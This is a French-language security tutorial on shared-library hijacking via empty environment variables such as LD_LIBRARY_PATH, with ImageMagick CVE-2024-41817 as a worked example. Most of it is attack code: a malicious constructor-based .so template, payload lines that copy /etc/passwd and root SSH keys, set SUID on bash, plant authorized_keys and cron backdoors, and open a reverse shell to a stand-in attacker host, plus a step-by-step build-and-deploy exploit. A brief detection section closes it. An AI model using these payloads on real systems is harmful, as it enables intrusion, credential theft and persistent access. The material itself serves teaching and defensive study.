# EMPTY ENV VARIABLES AND LIBRARY HIJACKING

## <mark style="color:red;">Library Hijacking via Variables d'Environnement Vides</mark>

### <mark style="color:blue;">Description de la faille</mark>

Le **Library Hijacking** via variables d'environnement vides est une technique d'exploitation qui tire parti d'un défaut de configuration dans la résolution des chemins de bibliothèques partagées. Lorsqu'une application définit des variables d'environnement avec des valeurs vides ou nulles pour localiser ses bibliothèques, le système d'exploitation va chercher ces bibliothèques dans le répertoire de travail actuel (CWD).

***

### <mark style="color:blue;">Mécanisme technique</mark>

#### <mark style="color:green;">Variables d'environnement critiques</mark>

Les principales variables exploitables sont :

* **`LD_LIBRARY_PATH`** : Chemin vers les bibliothèques partagées (.so)
* **`PATH`** : Chemin vers les exécutables
* **Variables spécifiques** : Comme `MAGICK_CONFIGURE_PATH` pour ImageMagick

#### <mark style="color:green;">Processus d'exploitation</mark>

```
1. Application définie : LD_LIBRARY_PATH=""
2. Système cherche dans : . (répertoire courant)
3. Attaquant place : bibliothèque malveillante
4. Application charge : bibliothèque de l'attaquant
5. Code malveillant : s'exécute automatiquement
```

***

### <mark style="color:blue;">Anatomie d'une bibliothèque malveillante</mark>

#### <mark style="color:green;">Structure de base</mark>

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// Constructeur : s'exécute au chargement de la bibliothèque
__attribute__((constructor)) void malicious_init() {
    // Code malveillant ici
    system("whoami > /tmp/hijack_proof.txt");
    // L'application continue normalement après
}

// Fonctions légitimes pour maintenir la compatibilité
int legitimate_function() {
    return 0;
}
```

#### <mark style="color:green;">Types de payloads</mark>

**1. Exfiltration de données**

```c
system("cp /etc/passwd /tmp/stolen_passwd");
system("cp /root/.ssh/id_rsa /tmp/stolen_key");
```

**2. Escalade de privilèges**

```c
system("chmod +s /bin/bash");  // SetUID sur bash
system("cp /bin/bash /tmp/rootshell; chmod +s /tmp/rootshell");
```

**3. Persistance**

```c
system("echo 'attacker_key' >> /root/.ssh/authorized_keys");
system("crontab -l > /tmp/cron_backup; echo '* * * * * /tmp/backdoor' | crontab -");
```

**4. Reverse shell**

```c
system("bash -i >& /dev/tcp/attacker_ip/4444 0>&1 &");
```

***

### <mark style="color:blue;">Exemple concret : CVE-2024-41817 (ImageMagick)</mark>

#### <mark style="color:green;">Contexte</mark>

ImageMagick 7.1.1-35 définit parfois `MAGICK_CONFIGURE_PATH=""` et `LD_LIBRARY_PATH=""`, causant une recherche dans le CWD.

#### <mark style="color:green;">Exploitation pratique</mark>

**1. Reconnaissance**

```bash
# Vérifier la version
identify --version

# Localiser les scripts utilisant ImageMagick
find /opt -name "*.sh" -exec grep -l "identify\|convert" {} \;
```

**2. Analyse du script cible**

```bash
#!/bin/bash
# /opt/scripts/identify_images.sh
cd /opt/app/static/assets/images/
identify *.jpg *.png 2>/dev/null
```

**3. Création de la bibliothèque malveillante**

```bash
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("cp /root/root.txt /tmp/root.txt; chmod 755 /tmp/root.txt");
    exit(0);
}
EOF
```

**4. Déploiement et déclenchement**

```bash
# Placer la bibliothèque dans le répertoire de travail
cp libxcb.so.1 /opt/app/static/assets/images/

# La bibliothèque sera chargée lors de la prochaine exécution d'ImageMagick
```

***

### <mark style="color:blue;">Vecteurs d'attaque communs</mark>

#### Applications vulnérables typiques

* **ImageMagick** : `MAGICK_CONFIGURE_PATH`, `LD_LIBRARY_PATH`
* **Python** : `PYTHONPATH`
* **Java** : `CLASSPATH`, `LD_LIBRARY_PATH`
* **Node.js** : `NODE_PATH`
* **Perl** : `PERL5LIB`

#### <mark style="color:green;">Scénarios d'exploitation</mark>

**1. Scripts automatisés**

```bash
# Script qui traite des fichiers utilisateur
cd /uploads/user_files/
process_files.sh  # Vulnérable si LD_LIBRARY_PATH=""
```

**2. Services web**

```python
# Application web qui traite des uploads
import os
os.chdir('/var/www/uploads/')
os.system('identify uploaded_image.jpg')  # Vulnérable
```

**3. Tâches cron**

```bash
# Cron job qui s'exécute dans un répertoire utilisateur
0 * * * * cd /home/user/data && process_data
```

***

### <mark style="color:blue;">Techniques de détection</mark>

#### <mark style="color:green;">Surveillance en temps réel</mark>

**1. Monitoring des bibliothèques chargées**

```bash
# Utiliser strace pour surveiller les chargements
strace -e trace=openat -f -p PID 2>&1 | grep "\.so"

# Utiliser lsof pour voir les bibliothèques ouvertes
lsof -p PID | grep "\.so"
```

**2. Audit des variables d'environnement**

```bash
# Vérifier les variables d'environnement d'un processus
cat /proc/PID/environ | tr '\0' '\n' | grep -E "(PATH|LD_LIBRARY_PATH)"
```

**3. Surveillance des fichiers**

```bash
# Surveiller la création de .so dans des répertoires suspects
inotifywait -m -r /tmp /var/tmp /uploads --include="\.so$"
```
